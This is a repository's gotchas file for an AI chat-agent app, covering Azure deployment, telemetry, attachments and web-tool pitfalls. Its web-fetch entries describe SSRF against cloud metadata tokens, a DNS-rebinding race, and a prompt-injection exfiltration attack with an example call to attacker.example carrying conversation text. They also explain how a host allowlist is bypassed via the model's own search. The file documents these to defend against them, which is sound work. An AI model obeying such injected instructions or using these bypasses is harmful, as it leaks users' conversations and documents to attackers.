# Gotchas & exemplars

The ONLY prose knowledge file in this repo. Two kinds of entries, both cheap to
verify and dated. Add entries via `/gotcha`; re-verify via `/audit-docs`.
Rule of thumb: if the code can express it (types, lint rule, test), it does NOT
belong here. Only constraints invisible in the code itself.

**Size guardrail:** this file describes the *present*, not history (history lives in
`.agentic/decisions/`), so it should hover around equilibrium — roughly ≤40 entries.
Beyond that, do NOT split first: audit for entries that should be lint rules, ADRs,
or deletions (a bloated gotchas file almost always means the admission test lapsed).
Only if 40+ entries survive that audit, split by area into `.agentic/gotchas/<area>.md`
and turn this file into a one-line-per-area index.

Format — every entry MUST have `evidence:` (a repo path) and `verified:` (date):

## Exemplars (canonical shapes — copy these, don't invent)

| Shape                                          | Exemplar                                          | Verified   |
|------------------------------------------------|---------------------------------------------------|------------|
| Orleans grain (state + reminders + agent tools) | `src/Agent42.Agents/AgentGrain.cs`                | 2026-07-07 |
| Per-user registry grain (list-in-state)         | `src/Agent42.Agents/AgentRegistryGrain.cs`        | 2026-07-07 |
| Per-user singleton-preference grain (get/save)  | `src/Agent42.Agents/UserProfileGrain.cs`          | 2026-07-08 |
| Minimal-API endpoint group                      | `src/Agent42.Backend/AgentApi.cs`                 | 2026-07-07 |
| Grain test (Orleans TestCluster + fake client)  | `tests/Agent42.Tests/AgentGrainTests.cs`          | 2026-07-07 |
| Bicep module                                    | `infra/modules/cosmos.bicep`                      | 2026-07-06 |
| Frontend logic (vanilla JS, no framework)       | `src/Agent42.Backend/wwwroot/app.js`              | 2026-07-07 |
| Storage abstraction (interface + prod + in-mem) | `src/Agent42.Agents/IAttachmentStore.cs`, `src/Agent42.Agents/InMemoryAttachmentStore.cs`, `src/Agent42.Backend/BlobAttachmentStore.cs` | 2026-07-08 |
| PWA service worker (root scope, auth-safe)      | `src/Agent42.Backend/wwwroot/sw.js`               | 2026-07-06 |
| Runtime agent skill (progressive disclosure)    | `src/Agent42.Agents/Skills/scheduledprompt/SKILL.md` | 2026-07-06 |
| Guarded outbound HTTP (SSRF, connect-time)      | `src/Agent42.Backend/WebPageFetcher.cs`, `src/Agent42.Backend/PrivateAddressGuard.cs` | 2026-07-12 |

## Constraints

### Chrome on Android flags interim speech results as `isFinal` with `confidence: 0`

- **Claim:** Voice dictation cannot be verified on desktop alone. Desktop Edge/Chrome and
  Chrome-on-Android deviate from the Web Speech spec in *different* ways, and a transcript
  fold correct on one stacks growth stages ("Hoe" + "Hoe laat" + …) on the other — the
  double-output bug on Android PWAs. On Android every interim stage arrives `isFinal: true`
  with `confidence: 0`; promoting it into the permanent `finalTranscript` accumulator (which
  never revisits what it appended) re-adds each stage. Only the interim branch is
  self-correcting (rebuilt per event), so an unscored result must fall through to it — hence
  the `distrustZeroConfidenceFinals` UA guard in the result handler. The guard must stay
  Android-only: desktop engines may report `confidence: 0` on a genuine final, and demoting it
  there silently drops the segment. The C# asset tests are source-text heuristics (no JS
  runner in repo), so they cannot catch an engine deviation — always retest dictation on a
  real Android PWA.
- **Evidence:** `src/Agent42.Backend/wwwroot/app.js` (`distrustZeroConfidenceFinals`);
  upstream precedent: `react-speech-recognition` `RecognitionManager.js`
- **Verified:** 2026-07-09

### A browser's upload Content-Type is unreliable for documents — resolve by extension

- **Claim:** the document-upload handler must NOT trust `IFormFile.ContentType` alone. Windows has
  no registered MIME type for many document extensions, so browsers send `application/octet-stream`
  (or an empty type) for `.docx`/`.pptx`/`.xlsx`/`.md` and even `.txt`, and OOXML files sometimes
  arrive as `application/zip`. Branching straight on the raw content type rejected real documents as
  "unsupported" (HTTP 400) — and the grain was never told the document existed, so the model stayed
  unaware. (`handleFiles` used to swallow the non-OK response silently; it now surfaces it as an
  `attach-chip--error` chip, so a wrongly-rejected document is at least visible — but the fix is to
  not misclassify it in the first place.) Resolve the effective type via `DocumentMediaTypes.ResolveMediaType(fileName,
  contentType)` (extension fallback) before the image/document branch, and feed the *resolved* type
  into ingestion so the extractor's switch matches. `.pdf` usually reports correctly, so a PDF-only
  test does not catch this — cover a generic/empty content type.
- **Evidence:** `src/Agent42.Backend/AgentApi.cs` (`ResolveMediaType` call before branching),
  `src/Agent42.Agents/DocumentMediaTypes.cs`,
  `tests/Agent42.Tests/DocumentMediaTypesTests.cs`
- **Verified:** 2026-07-10

### Easy Auth claim `typ` spellings for `user.*` telemetry are a prod-only fact

- **Claim:** the `user.email`/`user.full_name`/`user.roles` trace attributes (ADR 0009) are pulled
  from the `X-MS-CLIENT-PRINCIPAL` claims blob by matching each claim's `typ` against a **candidate
  list** in `CurrentUser.cs` (AAD v1/v2 and Easy Auth's own mapping spell them differently). Easy
  Auth is **absent locally** (ADR 0002 — DevHost doesn't even call `AddServiceDefaults`), so the
  real blob shape and `typ` spellings **cannot be verified offline**: the unit tests use a synthetic
  base64 blob built from the candidate `typ` values, which proves the parser, not the prod mapping.
  If an attribute is missing on a real trace at the collector after deploy, the claim `typ` is wrong
  for the tenant — add the observed spelling to the candidate list here; that is a config fact, not a
  code bug. `user.id`/`user.name`/`user.idp` come from plain headers and are not affected. Parsing is
  defensive: a missing/non-base64/non-JSON blob never throws — header attributes still emit.
- **Evidence:** `src/Agent42.Backend/CurrentUser.cs` (`EmailClaimTypes`/`FullNameClaimTypes`/`RoleClaimTypes`, `ParsePrincipalClaims`), `tests/Agent42.Tests/UserTelemetryTests.cs`, `.agentic/decisions/0009-user-identity-telemetry-attributes.md`
- **Verified:** 2026-07-11

### User identity reaches downstream/grain spans via Orleans RequestContext, never Activity.Baggage

- **Claim:** downstream `user.*` span attribution (ADR 0010) propagates the identity to the grain-side
  chat-completion span through **Orleans `RequestContext`** (`UserTelemetryMiddleware` sets a serializable
  `UserTelemetryContext` first in the pipeline; `UserTelemetrySpanProcessor.OnStart` stamps every started
  span from it). It must **never** be `Activity.Baggage`: the default `DistributedContextPropagator`
  injects a W3C `baggage` request header on outbound HttpClient calls, which would ship user PII
  (name/email/roles) to **Azure OpenAI** in headers. `RequestContext` is an in-cluster channel (Orleans'
  own protocol, never an external HTTP header), so identity reaches the grain without leaking outward —
  the load-bearing reason for the design. This is the **one** `RequestContext` use in the repo.
  `NoBaggageWriteApi_IsUsedInTelemetryPath` guards against `SetBaggage`/`AddBaggage` creeping in.
- **Load-bearing behaviour:** Orleans 10.2 propagates `RequestContext` into the *streaming* `ChatAsync`
  grain path by default. That is **not** self-evident and is guarded by `RequestContextPropagationTests`
  (a `FakeChatClient` `[uctx:…]` echo read at the in-grain chat-client call site). If an Orleans upgrade
  flips that default, that test fails first — restore propagation (silo config or a grain-call-filter
  pair) before shipping. The actual OTel stamp on a real in-grain span is prod-smoke (no OTel host offline).
- **Evidence:** `src/Agent42.Backend/UserTelemetryMiddleware.cs`, `src/Agent42.Backend/UserTelemetrySpanProcessor.cs`, `src/Agent42.Agents/UserTelemetryContext.cs`, `tests/Agent42.Tests/RequestContextPropagationTests.cs`, `.agentic/decisions/0010-downstream-user-telemetry-via-requestcontext.md`
- **Verified:** 2026-07-11

### An agent tool's RETURN value is persisted, and counts against the 2 MB session cap

- **Claim:** it is easy to see that chat messages are persisted and miss that **tool results are too**.
  A `FunctionResultContent` stays in the Agent Framework chat history (`AgentGrain`'s storage filter
  excludes only `AIContextProvider` and `ChatHistory` source types), and the grain re-serializes the
  whole session into **one `agent-state` Cosmos item every turn** — hard-capped at **2 MB** (ADR 0004).
  So a tool that returns a big payload does not merely bloat one reply: the payload sits in history
  forever, is re-sent to the model on every later turn, and eventually makes `WriteStateAsync` fail
  *after* the model has already answered — bricking the conversation, silently, **in prod only** (the
  in-memory test store has no 2 MB limit). **Therefore every web tool budgets what it RETURNS**, in
  `WebToolLimits`: a fetched page ≤ 8 KB of text, a search ≤ 5 results × ≤ 300-char snippets. Do not
  conflate this with `WebPageFetcher.MaxDownloadBytes` (~1 MB) — that is a *transport* guard and is a
  different number on purpose. Any new tool must count its return payload against this budget.
- **Evidence:** `src/Agent42.Agents/WebToolLimits.cs`, `src/Agent42.Agents/AgentGrain.cs`
  (`ExcludeInjectedContextMessages`, `ChatAsync`'s `SerializeSessionAsync`),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`ToolResults_DoNotBlowTheSessionSizeBudget`),
  `.agentic/decisions/0004-attachments-in-blob.md`
- **Verified:** 2026-07-12

### A model-chosen fetch URL is an SSRF sink — validate at connect time, not before

- **Claim:** `fetch_web_page` dials a URL the **model** picked, from inside a container whose
  system-assigned identity holds Cosmos, Storage and Azure OpenAI rights — and Azure's IMDS endpoint
  (`169.254.169.254`) mints tokens for that identity to anything that can make an HTTP request in
  there. The non-obvious part is **where** the guard must run: resolving the hostname, checking the
  answer, then handing the *hostname* to `HttpClient` is **TOCTOU-broken** — the socket resolves a
  second time and the attacker's second answer is the address you just rejected. The check must run on
  the address actually being dialled, in **`SocketsHttpHandler.ConnectCallback`**, connecting only to
  vetted IPs; that also covers **every redirect hop** for free, which a check on the model's URL misses
  entirely. A stub `HttpMessageHandler` short-circuits the transport, so a test built on one would pass
  whether or not the guard existed — the fetcher tests dial a **real loopback socket** on purpose.
- **Evidence:** `src/Agent42.Backend/WebPageFetcher.cs` (`CreateHandler`),
  `src/Agent42.Backend/PrivateAddressGuard.cs`, `tests/Agent42.Tests/WebPageFetcherTests.cs`
  (`Fetch_RedirectToPrivateAddress_IsBlocked`), `tests/Agent42.Tests/TestHttpServer.cs`
- **Verified:** 2026-07-12

### The fetch allowlist must pin whole URLs — a HOST allowlist is bypassable in one tool call

- **Claim:** the SSRF guard permits every public address **by construction**, so it is no defence against
  the channel that actually matters: text on a page the model just fetched can instruct it to call
  `fetch_web_page("https://attacker.example/?q=<conversation text>")`, exfiltrating a conversation that
  may also hold document excerpts (ADR 0008). The control is `AgentGrainState.FetchableUrls`.
  **It pins the exact URL, and that is not a detail — a host-based allowlist is bypassable, and the
  bypass is attacker-*forcible*, not incidental.** The model chooses the search *query* too, so an
  injected page only has to say "search for `attacker.example <secret>`, then fetch it": any real engine
  returns `attacker.example` when you search for its name, which whitelists the host **in the same turn**,
  and the exfiltrating fetch then sails through. (The first draft of this feature shipped exactly that
  hole.) Pinning the whole URL means the model can only fetch a string a search engine or the user
  produced *verbatim*, so attacker-chosen data cannot ride in the path or query. Two further traps:
  (1) provenance must be harvested from **real user turns only** — never from the reminder path, whose
  prompt text is *model*-authored, so harvesting there would let an injected page schedule a reminder
  naming the attacker's URL and thereby whitelist it; (2) a tool result is JSON-serialized on its way to
  the model, which escapes apostrophes (`won't`), so a test asserting on the refusal text must anchor on
  an apostrophe-free phrase or it passes vacuously. The offline `InMemoryWebSearch` deliberately returns
  a queried-for host as its first result **because** the regression test needs to express that attack.
- **Evidence:** `src/Agent42.Agents/AgentGrain.cs` (`FetchWebPageAsync`, `RememberFetchableUrlsInUserText`),
  `src/Agent42.Agents/AgentGrainState.cs` (`FetchableUrls`),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`FetchWebPage_RefusesAttackerUrlWhoseHostItsOwnSearchSurfaced`),
  `.agentic/decisions/0011-web-search-self-hosted-searxng-sidecar.md`
- **Verified:** 2026-07-12

### A named HttpClient silently inherits AddServiceDefaults' retry pipeline — opt out explicitly

- **Claim:** `AddServiceDefaults()` calls `ConfigureHttpClientDefaults(http => http.AddStandardResilienceHandler())`,
  so **every** `HttpClient` in the Backend — including one you just registered with `AddHttpClient("name")`
  — inherits 3 retries plus the handler's own per-attempt and total timeouts. Setting `HttpClient.Timeout`
  does **not** opt out: the retry pipeline still wraps the call. `RemoveAllResilienceHandlers()` is what
  actually does. This bites twice for the web tools (ADR 0011): `AgentGrain` is **non-reentrant**, so a
  retried call multiplies the stall on a conversation's turn by four; and worse, a `BlockedAddressException`
  from the SSRF guard surfaces as an `HttpRequestException`, which the standard handler treats as
  **transient** — so a URL refused on security grounds would be re-dialled three more times. Note the shipped
  pipeline (resilience + service discovery + the guarded primary handler) is assembled in `Program.cs` and
  is not what the unit tests construct, so no test will catch this for you.
- **Evidence:** `src/Agent42.ServiceDefaults/Extensions.cs` (`ConfigureHttpClientDefaults`),
  `src/Agent42.Backend/Program.cs` (`RemoveAllResilienceHandlers` on both web clients)
- **Verified:** 2026-07-12

### SearXNG is self-hosted, NOT private — it forwards every query to DuckDuckGo/Bing

- **Claim:** "self-hosted search" reads like "the query never leaves our infrastructure". It does leave.
  SearXNG is a ***meta*search** engine: it forwards each query to the upstream engines enabled in
  `infra/searxng/settings.yml` (`duckduckgo`, `bing`, `wikipedia`). What self-hosting actually buys is
  **no API key, no per-query bill, and no per-user attribution** — queries arrive at the upstream engines
  unauthenticated from the container's IP. That is the claim to make; the privacy one is false, and it
  was wrong in five places in the first draft of this feature (including in the `websearch` SKILL.md,
  i.e. told to the model, and therefore to users). The consequence that matters: because the **model**
  writes the search query, `web_search` is an outbound text channel that the `fetch_web_page` URL
  allowlist does **not** cover — a prompt-injected page could put conversation text in a query. The skill
  instructs the model never to do that; it is mitigation, not prevention (ADR 0011).
- **Evidence:** `infra/searxng/settings.yml` (`keep_only:` engine list),
  `src/Agent42.Agents/Skills/websearch/SKILL.md`, `src/Agent42.Agents/IWebSearch.cs`,
  `.agentic/decisions/0011-web-search-self-hosted-searxng-sidecar.md`
- **Verified:** 2026-07-12

### SearXNG: the JSON API answers 403 unless enabled, and the port moves only via env

- **Claim:** two traps, both verified by running the image. (1) SearXNG serves **only** the formats
  listed under `search.formats` — `html` alone by default — and answers a request for an unlisted format
  with **HTTP 403**, which reads like an auth failure and sends you hunting for an API key that does not
  exist (the sidecar has no auth). `json` must be listed in `infra/searxng/settings.yml`; with it removed
  the same instance returns 403 for `?format=json` while `?format=html` returns 200. (2) **`server.port`
  in `settings.yml` is inert for the bind.** The image's entrypoint does
  `export GRANIAN_PORT="${SEARXNG_PORT:-$GRANIAN_PORT}"`, so the listener follows the **`SEARXNG_PORT`
  env var** — with only `server.port: 8888` in the config the container still listened on **8080**, which
  collides with the backend's ingress `targetPort` (containers in one Container App share a network
  namespace and talk over localhost). The port move lives in `container-app.bicep` / `AppHost.cs`, not in
  the config file. Upstream ships rolling date tags, so the Dockerfile pins an immutable one, never
  `latest`.
- **Evidence:** `infra/searxng/settings.yml`, `infra/searxng/Dockerfile`,
  `infra/modules/container-app.bicep` (`SEARXNG_PORT`), `src/Agent42.Backend/SearxngWebSearch.cs`
  (the 403 message names the cause)
- **Verified:** 2026-07-12

### Container Apps bills the per-replica total across ALL containers in the replica

- **Claim:** adding a sidecar is not free and not independent. Azure Container Apps bills the
  **per-replica** total, and the **sum** of CPU/memory across every container in the replica must land on
  an allowed combination (CPU in 0.25 steps, memory ≈ 2 GiB per CPU) — an invalid sum is rejected at
  deploy, not at authoring. The SearXNG sidecar took the replica from `0.5 CPU / 1Gi` to
  **`1.0 CPU / 2Gi`** (backend unchanged + sidecar `0.5/1Gi`), roughly doubling the app's compute cost.
  Replicas stay pinned at 1 (`@minValue(1) @maxValue(1)` — Orleans localhost clustering), so there is
  exactly one sidecar per deployment. `az bicep build` will not catch a bad combination; an
  `az deployment group validate` against the real RG will.
- **Evidence:** `infra/main.bicep` (`containerCpu`/`containerMemory` + `searxngCpu`/`searxngMemory`),
  `infra/modules/container-app.bicep` (two containers in `template.containers`)
- **Verified:** 2026-07-12

### Cosmos containers must be pre-declared in Bicep

- **Claim:** the Cosmos account has `disableLocalAuth: true` and AAD data-plane RBAC cannot create databases/containers — only ARM can. Any new container must be added to `infra/modules/cosmos.bicep`; Orleans providers run with `IsResourceCreationEnabled = false`, so runtime auto-create silently isn't there to save you.
- **Evidence:** `infra/modules/cosmos.bicep`, `src/Agent42.Backend/Program.cs`
- **Verified:** 2026-07-06

### Cosmos account region is pinned to northeurope and immutable

- **Claim:** West Europe rejected new Cosmos accounts at creation time; the account was created in North Europe and a Cosmos account's region can't change after creation. The `cosmosLocation="northeurope"` parameter in the deploy workflow must keep matching where the account actually lives.
- **Evidence:** `.github/workflows/deploy.yml`
- **Verified:** 2026-07-06

### Custom domain must stay declared in Bicep

- **Claim:** an undeclared custom domain gets silently unbound on the next deploy. `customDomainName`/`customDomainCertificateName` must stay set, and the certificate name must match the auto-generated managed certificate — if the cert is ever recreated, update the name or the deployment unbinds the domain again.
- **Evidence:** `infra/modules/container-app.bicep`
- **Verified:** 2026-07-06

### OpenAI role grant is a CLI step in the deploy workflow, not Bicep

- **Claim:** the AI Foundry account lives in RG `agent42`, where the deploy SP has only `Microsoft.Authorization/roleAssignments/write` scoped to that one account — not `Microsoft.Resources/deployments/write`. A cross-RG Bicep module therefore fails; the grant is an idempotent `az rest` PUT in the deploy workflow. Don't "clean it up" into Bicep.
- **Evidence:** `.github/workflows/deploy.yml` (Grant Cognitive Services OpenAI User step + comment)
- **Verified:** 2026-07-06

### Deploy service principal uses a client secret, not OIDC

- **Claim:** `sp-agent42-deploy` authenticates with a client secret, so `azure/login` needs the full credentials JSON (`clientId`+`clientSecret`+…), not the OIDC client-id-only form.
- **Evidence:** `.github/workflows/deploy.yml`
- **Verified:** 2026-07-06

### Minimal-API handlers returning a bare string serve text/plain, not JSON

- **Claim:** an endpoint whose handler returns `string` (e.g. `GetSelectedModelAsync()`'s
  `Task<string>`) is written as `Content-Type: text/plain` with the raw value (`gpt-4o`),
  NOT JSON (`"gpt-4o"`). The frontend calls `response.json()` on every endpoint, which
  then throws `SyntaxError` — and because that call sat before the history render in one
  shared `try`, it silently hid the whole conversation. Wrap string results in
  `Results.Json(...)` so the API is uniformly JSON. Keep UI side-effects that can throw
  (model-picker restore) after the primary render.
- **Corollary — `Results.Json(null)` writes no body and no content-type.** Returning a
  nullable value (e.g. `Task<AgentBinding?>` from the `/agent` endpoint) through
  `Results.Json` sends an empty 200 with *no* `Content-Type` when the value is null, which
  re-trips the same `response.json()` failure. Serialize explicitly for nullable payloads:
  `Results.Text(JsonSerializer.Serialize(value, JsonSerializerOptions.Web), "application/json")`
  so an absent value comes back as a real JSON `null`.
- **Evidence:** `src/Agent42.Backend/AgentApi.cs` (`/model` and `/agent` endpoints), `src/Agent42.Backend/wwwroot/app.js` (`selectConversation`), `tests/Agent42.Tests/AgentApiTests.cs`
- **Verified:** 2026-07-07

### Service worker must stay network-first for navigations and bypass /api

- **Claim:** the whole app is behind Entra Easy Auth at the ingress (ADR 0002), so an
  expired session turns any navigation into a 302 redirect to the Entra login. The PWA
  service worker (`src/Agent42.Backend/wwwroot/sw.js`) is therefore **network-first for `req.mode ===
  "navigate"`** (cached `index.html` is an offline-only fallback) and **returns early for
  any `/api` path before touching the cache**. "Optimizing" the SW to cache-first
  navigations would serve a stale shell over the login redirect (auth silently breaks);
  caching `/api` would stale/leak per-user, auth-bearing, streaming chat responses. The
  `PwaAssetsTests.ServiceWorker_BypassesApiBeforeCaching` test guards the `/api` ordering,
  but the navigation strategy is only enforced here — keep it network-first.
- **Evidence:** `src/Agent42.Backend/wwwroot/sw.js`, `.agentic/decisions/0002-entra-easy-auth-gate.md`
- **Verified:** 2026-07-06

### A shared static instance must never be a grain-state default (Orleans mutates it)

- **Claim:** giving Orleans grain state a default that is a *cached static* instance
  (`public static T Empty { get; } = new(...)` used as `State.Prop = T.Empty`) leaks across
  grains: Orleans' generated copier/serializer writes *into* the state object it is handed, so
  every grain that started from the shared instance ends up seeing another grain's value. This
  is invisible in the code (the record is immutable-looking) and hides in single-test runs — it
  only surfaces when two grains with *different* keys are exercised in one process and one reads
  another's data. Make the default a **factory** (`public static T Empty => new(...)`, a fresh
  instance per access) or initialize the field with `new(...)` directly — never a `{ get; } =`
  singleton. Same discipline as the list defaults (`= []`) elsewhere.
- **Evidence:** `src/Agent42.Agents/UserProfile.cs` (`Empty` is `=> new("")`), `src/Agent42.Agents/UserProfileGrain.cs` (its UserProfileState.Profile property), `tests/Agent42.Tests/UserProfileGrainTests.cs` (`UserProfile_Empty_IsAFreshInstance_NotASharedSingleton` deterministically guards the factory property; `UserProfile_IsIsolatedPerUser` originally surfaced the leak in-cluster)
- **Verified:** 2026-07-08

### Agent Framework 1.13 session API differs from older samples

- **Claim:** it's `AgentSession` with `CreateSessionAsync` / `SerializeSessionAsync` / `DeserializeSessionAsync` — the `AgentThread` / `GetNewThread()` API from pre-1.13 samples (and model training data) no longer exists. Copy `AgentGrain.cs`, not blog posts.
- **Evidence:** `src/Agent42.Agents/AgentGrain.cs`
- **Verified:** 2026-07-06

### Testing that a bound persona reaches the model needs the fake to echo its instructions

- **Claim:** a `ChatClientAgent` built with `ChatClientAgentOptions.ChatOptions.Instructions`
  delivers the system prompt to the *terminal* `IChatClient`, but a canned fake that only
  returns a fixed reply can't prove it arrived — a storage round-trip
  (`GetAgentBindingAsync`) proves the prompt was *saved*, not *delivered*. So `FakeChatClient`
  deliberately echoes what it receives: it prepends a `[sys:…]` marker built from the
  instructions it sees (checking `options?.Instructions` first, then any system-role
  `ChatMessage`, so the echo is robust to however AF carries them), letting a test assert the
  persona reached the model. Two traps when writing that assertion: the `AgentSkillsProvider`
  *appends* its skill catalog to the instructions, so assert the prompt is *contained*, not an
  exact match; and every chat now carries the default persona as instructions, so assert on a
  *distinctive* bound prompt, not merely on non-empty instructions.
- **Evidence:** `tests/Agent42.Tests/FakeChatClient.cs` (`InstructionsEcho`), `tests/Agent42.Tests/AgentGrainTests.cs` (`AgentChat_AppliesBoundSystemPrompt`)
- **Verified:** 2026-07-07

### Image attachment bytes must stay out of the session, and prior-turn image URLs get re-fetched

- **Claim:** the serialized `AgentSession` is written to one `agent-state` Cosmos item every
  turn, and Cosmos caps an item at **2 MB** — so attachment bytes can never be inlined
  (`DataContent`), or the first real photo blows the limit (ADR 0004). Images live in blob
  storage and reach the model as a **`UriContent` user-delegation SAS URL** (a short string).
  The non-obvious trap: a Step 1 spike proved Azure OpenAI **re-fetches a prior turn's image
  URL on every later turn**, so a short-lived SAS baked into a reopened conversation would 400.
  `AgentGrain` therefore **rehydrates before every model call** (`RehydrateAttachmentUrlsAsync`,
  from both `ChatAsync` and `ReceiveReminder`) — refreshing the SAS on every attachment
  `UriContent` in the session. Not just on activation: a warm grain serves many turns without
  reactivating, so an activation-only refresh would let a short-lived SAS lapse mid-conversation
  and 400 on the next turn. It also persists per-turn refs in `AgentGrainState.TurnAttachments`
  (one entry per user turn, in order,
  including an empty entry on the reminder path) so history joins turns to images by index.
  Don't "simplify" back to `DataContent`, and don't drop the rehydrate step. This is a prod-blob
  property the offline harness can't test (the in-memory store returns non-expiring URLs).
- **Evidence:** `src/Agent42.Agents/AgentGrain.cs` (`RehydrateAttachmentUrlsAsync`, `ChatAsync`, `AlignTurnAttachmentsToHistory`), `src/Agent42.Backend/BlobAttachmentStore.cs`, `.agentic/decisions/0004-attachments-in-blob.md`
- **Verified:** 2026-07-08

### Attachments Storage RBAC is in Bicep — but only because the deploy SP was elevated once

- **Claim:** the **Storage Blob Data Contributor** grant to the container app identity
  (`infra/modules/storage-role-assignment.bicep`) is classic `Microsoft.Authorization/roleAssignments`,
  which a plain Contributor cannot create. It works in Bicep only because the deploy SP
  (`sp-agent42-deploy`) was granted **Role Based Access Control Administrator** on `rg-agent42` — a
  one-time manual elevation done 2026-07-08 (`az role assignment create … --role "Role Based Access
  Control Administrator" --scope subscriptions/<sub>/resourceGroups/rg-agent42`). If that elevation is
  removed or the SP recreated, this module's deploy fails with an authorization error — fall back to a
  manual `az role assignment create` of Storage Blob Data Contributor. This is the key difference from
  the **OpenAI grant, which stays manual** (its account is in a *different* RG where a cross-RG Bicep
  role module fails). The role also authorizes `generateUserDelegationKey`, so no account key is needed
  (shared-key auth is disabled on the account). The agent never runs role-assignment writes itself; the
  one-time elevation was run by the user.
- **Gotcha on Windows/Git Bash:** an `az … --scope "/subscriptions/…"` argument starting with `/` is
  mangled by MSYS path conversion into a Windows path → ARM returns `MissingSubscription`. Drop the
  leading `/` (`--scope "subscriptions/…"`) or prefix the command with `MSYS_NO_PATHCONV=1`.
- **Evidence:** `infra/modules/storage-role-assignment.bicep`, `infra/main.bicep` (`storageRoleAssignment` module), `infra/modules/storage.bicep`
- **Verified:** 2026-07-08

### Document RAG embedding deployment is a manual prerequisite — but needs no new RBAC

- **Claim:** the `text-embedding-3-large` deployment used for document RAG (ADR 0007) is **not**
  provisioned by this repo's Bicep — it lives in the `Agent42` AI Foundry account in the *different*
  RG `agent42`, the same reason the OpenAI role grant stays a manual step. The user must create the
  deployment and its name must match `AzureOpenAI:EmbeddingDeploymentName` (default
  `text-embedding-3-large`, eager-validated at startup — a missing value throws before the first
  upload, not on it). **No new role assignment is required:** the container app identity's existing
  *Cognitive Services OpenAI User* grant already authorizes embeddings on that account, so the
  embedding client reuses the same endpoint + `DefaultAzureCredential` as the chat client.
- **Evidence:** `src/Agent42.Backend/Program.cs` (embedding-generator registration + eager check), `src/Agent42.Backend/appsettings.json`, `.agentic/decisions/0007-document-rag-cosmos-vector-search.md`
- **Verified:** 2026-07-09

### Cosmos vector search is prod-only: capability + pre-created container + no create-on-use

- **Claim:** document retrieval (ADR 0007) needs the account-level `EnableNoSQLVectorSearch`
  capability **and** the `doc-chunks` container pre-created in Bicep with its vector policy
  (partition `/ownerKey`, vector path `/embedding` float32/cosine/3072, **`quantizedFlat`** index — a
  `flat` index caps at 505 dims and can't hold a 3072-dim embedding). `CosmosDocumentIndex` uses the
  **raw `CosmosClient` and never creates on use** — the account is `disableLocalAuth: true`, so
  AAD data-plane RBAC can't create the container (same 403 wall as the Orleans providers); a vector
  *connector* that calls `EnsureCollectionExists` would fail here. The container schema in Bicep
  (property names `ownerKey`/`embedding`, lowercase `id`) must exactly match the item POCO the code
  writes/reads. This path **cannot be exercised offline**: `Program.cs` registers `CosmosDocumentIndex`
  only when `Cosmos:DocChunksContainerName` is set (threaded from Bicep in prod); under the AppHost
  Cosmos emulator that key is absent, so the in-memory index is used and the emulator never runs a
  vector query — the emulator uses a well-known key and can't reproduce the no-create-rights wall
  anyway. The `ORDER BY VectorDistance(...)` (ascending) → most-similar-first ordering is a prod-smoke
  fact (AC7), not something the offline harness verifies.
- **Evidence:** `infra/modules/cosmos.bicep` (`doc-chunks` container + capability), `src/Agent42.Backend/CosmosDocumentIndex.cs`, `src/Agent42.Backend/Program.cs` (index branch), `.agentic/decisions/0007-document-rag-cosmos-vector-search.md`
- **Verified:** 2026-07-09

### Docnet.Core DocLib.Instance is a process-global native singleton — serialize PDF extraction

- **Claim:** PDF text extraction (ADR 0007) uses Docnet.Core, which wraps a **process-global native
  PDFium handle** via `DocLib.Instance`. It is **not safe for concurrent `GetDocReader` calls**, so
  `DocumentTextExtractor` serializes every PDF extraction through a single static lock. Do not
  dispose `DocLib.Instance` per call (it frees the native library for the whole process); only the
  `IDocReader`/`IPageReader` are disposed. Fine at per-conversation, synchronous-ingestion scale.
- **Evidence:** `src/Agent42.Agents/DocumentTextExtractor.cs` (`PdfLock`)
- **Verified:** 2026-07-09
